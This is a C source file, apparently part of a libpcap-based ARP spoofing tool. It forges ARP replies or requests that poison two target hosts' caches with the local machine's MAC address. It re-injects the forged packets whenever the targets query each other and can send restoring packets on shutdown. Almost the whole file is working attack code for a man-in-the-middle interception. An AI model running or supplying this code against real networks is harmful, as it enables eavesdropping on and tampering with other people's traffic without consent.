#include <string.h>
#include <stdlib.h>

#include "resolve.h"
#include "def.h"
#include "util.h"


static bool       use_requests  = false;
static bool       spoof_running = false;
static pcap_t    *pcap_handle;
static Host       local_host;
static Host       targets[TARGETS];
static ARPPacket  packets[TARGETS];
static uint8_t    packet_buffer[TARGETS][PACKET_LEN];


static void write_packet      (ARPPacket *p, uint8_t *b);
static void respoof           (u_char *u, const struct pcap_pkthdr *h, const u_char *p);
static void init_spoof_reply  (ARPPacket *pack, Host *target, Host *sender, Host *local, bool grat);
static void send_spoof_packet (enum target T);


static void write_packet(ARPPacket *packet, uint8_t *pbuff)
{
    EthernetHeader eth_h;
    memcpy(&eth_h.target_addr, packet->eth_des_mac, MAC_SIZE);
    memcpy(&eth_h.sender_addr, packet->eth_src_mac, MAC_SIZE);
    eth_h.protocol = htons(ETHER_TYPE_ARP);

    ARPHeader arp_h;
    arp_h.hardware_type = htons(1);
    arp_h.protocol_type = htons(ETH_P_IP);
    arp_h.hardware_addr_len = 6;
    arp_h.protocol_addr_len = 4;
    arp_h.operation = packet->arp_operation;
    memcpy(&arp_h.sender_hardware_addr, packet->arp_src_mac, MAC_SIZE);
    memcpy(&arp_h.sender_protocol_addr, packet->arp_src_ip,  IP_SIZE);
    memcpy(&arp_h.target_hardware_addr, packet->arp_des_mac, MAC_SIZE);
    memcpy(&arp_h.target_protocol_addr, packet->arp_des_ip,  IP_SIZE);

    // Write headers to buffer
    memcpy(pbuff, &eth_h, ETH_HEADER_LEN);
    memcpy(pbuff + ETH_HEADER_LEN, &arp_h, ARP_HEADER_LEN);
}


static void respoof(__attribute__ ((unused)) u_char *user,
                    __attribute__ ((unused)) const struct pcap_pkthdr *header,
                    const u_char * packet)
{
    const ARPHeader *arp = (const ARPHeader*) (packet + ETH_HEADER_LEN);

    if (use_requests && arp->operation == ARPOP_REPLY) {
        if (ip_match(arp->sender_protocol_addr, targets[T1].ip) ||
            ip_match(arp->sender_protocol_addr, targets[T2].ip)) {
            fprintf(stdout, "Recieving an ARP reply from ");
            print_ip(stdout, arp->sender_protocol_addr);
            fprintf(stdout, "\n");
        }
    }

    if (arp->operation != ARPOP_REQUEST)
        return;

    /* target 1 is sending an ARP request to target 2*/
    if (ip_match(arp->sender_protocol_addr, targets[T1].ip) &&
        ip_match(arp->target_protocol_addr, targets[T2].ip))
    {
        send_spoof_packet(T1);
        send_spoof_packet(T2);
        return;
    }

    /* Target 2 is sending an ARP request to target 1. */
    if (ip_match(arp->sender_protocol_addr, targets[T2].ip) &&
        ip_match(arp->target_protocol_addr, targets[T1].ip))
    {
        send_spoof_packet(T1);
        send_spoof_packet(T2);
        return;
    }
}


static void send_spoof_packet(enum target T)
{
    if (verbose)
        print_packet(&packets[T]);

    pcap_inject(pcap_handle, (uint8_t*) &packet_buffer[T], PACKET_LEN);
}


static void init_spoof_reply(ARPPacket *pack, Host *target, Host *sender, Host *local, bool grat)
{
    memcpy(&(pack->eth_src_mac), local->mac, MAC_SIZE);
    memcpy(&(pack->eth_des_mac), target->mac, MAC_SIZE);

    pack->arp_operation = ARPOP_REPLY;
    memcpy(&(pack->arp_src_ip), sender->ip, IP_SIZE);

    if (grat)
        memcpy(&(pack->arp_des_ip), sender->ip, IP_SIZE);
    else
        memcpy(&(pack->arp_des_ip), target->ip, IP_SIZE);

    memcpy(&(pack->arp_src_mac), local->mac, MAC_SIZE);
    memcpy(&(pack->arp_des_mac), target->mac, MAC_SIZE);
}


static void init_spoof_request(ARPPacket *pack, Host *target, Host *sender, Host *local)
{
    memcpy(&(pack->eth_src_mac), local->mac, MAC_SIZE);
    memcpy(&(pack->eth_des_mac), target->mac, MAC_SIZE);

    pack->arp_operation = ARPOP_REQUEST;
    memcpy(&(pack->arp_src_ip), sender->ip, IP_SIZE);
    memcpy(&(pack->arp_des_ip), target->ip, IP_SIZE);
    memcpy(&(pack->arp_src_mac), local->mac, MAC_SIZE);
    memset(&(pack->arp_des_mac), 0, MAC_SIZE);
}


static void send_unspoofs(void)
{
    uint8_t   buff[PACKET_LEN];
    ARPPacket pack;

    if (use_requests)
        init_spoof_request(&pack, &targets[T1], &targets[T2], &targets[T2]);
    else
        init_spoof_reply(&pack, &targets[T1], &targets[T2], &targets[T2], true);

    write_packet(&pack, buff);
    pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);

    memset(&pack, 0, sizeof(ARPPacket));

    if (use_requests)
        init_spoof_request(&pack, &targets[T2], &targets[T1], &targets[T1]);
    else
        init_spoof_reply(&pack, &targets[T2], &targets[T1], &targets[T1], true);

    write_packet(&pack, buff);
    pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
}


void spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *local, bool grat, bool req)
{
    pcap_handle  = pcap_h;
    use_requests = req;

    memcpy(&targets, t, sizeof(Host) * TARGETS);
    memcpy(&local_host, local, sizeof(Host));

    if (use_requests) {
        init_spoof_request(&packets[T1], &targets[T1], &targets[T2], &local_host);
        init_spoof_request(&packets[T2], &targets[T2], &targets[T1], &local_host);
    } else {
        init_spoof_reply(&packets[T1], &targets[T1], &targets[T2], &local_host, grat);
        init_spoof_reply(&packets[T2], &targets[T2], &targets[T1], &local_host, grat);
    }
    write_packet(&packets[T1], packet_buffer[T1]);
    write_packet(&packets[T2], packet_buffer[T2]);
}


int spoof_run(void)
{
    send_spoof_packet(T1);
    send_spoof_packet(T2);

    return pcap_loop(pcap_handle, 0, respoof, NULL);
}


void spoof_stop(void)
{
    if (!spoof_running)
        return;

    if (unspoof)
        send_unspoofs();

    pcap_breakloop(pcap_handle);
}
